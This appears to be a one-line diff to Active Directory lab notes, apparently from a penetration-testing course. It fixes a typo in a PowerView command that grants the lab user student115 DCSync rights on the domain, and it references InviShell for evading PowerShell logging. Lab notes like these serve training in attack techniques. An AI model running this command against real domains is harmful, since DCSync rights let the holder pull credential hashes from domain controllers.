@@ -514,5 +514,5 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 ```
 add the permission to student115 
 ```powerview
-Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student115 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local - TargetDomain dollarcorp.moneycorp.local -Verbose
+Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student115 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
